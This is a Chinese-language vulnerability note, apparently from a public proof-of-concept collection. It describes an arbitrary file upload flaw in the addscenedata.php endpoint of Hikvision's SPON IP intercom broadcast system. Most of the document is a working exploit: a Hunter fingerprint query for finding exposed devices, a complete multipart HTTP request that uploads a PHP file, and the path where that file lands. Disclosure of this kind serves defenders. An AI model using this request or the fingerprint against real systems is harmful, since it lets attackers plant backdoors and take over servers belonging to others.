# 海康威视SPON IP网络对讲广播系统addscenedata存在任意文件上传漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">Hikvision Intercom Broadcasting System是中国海康威视（Hikvision）公司的一个对讲广播系统。海康威视SPON IP网络对讲广播系统addscenedata存在任意文件上传漏洞，恶意攻击者可能会上传恶意的后门文件，使服务器失陷。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 海康威视SPON IP网络对讲广播系统

# 三、资产测绘
+ Hunter：`web.body="vendors/custom/html5.min.js"`
+ 特征


# 四、漏洞复现
```java
POST /php/addscenedata.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Connection: close
Content-Length: 218
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4LuoBRpTiVBo9cIQ
Accept-Encoding: gzip

------WebKitFormBoundary4LuoBRpTiVBo9cIQ
Content-Disposition: form-data; name="upload"; filename="tt.php"
Content-Type: text/plain

123
------WebKitFormBoundary4LuoBRpTiVBo9cIQ--
```


上传文件位置

```java
/images/scene/tt.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fv7cprclagh53ls1>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
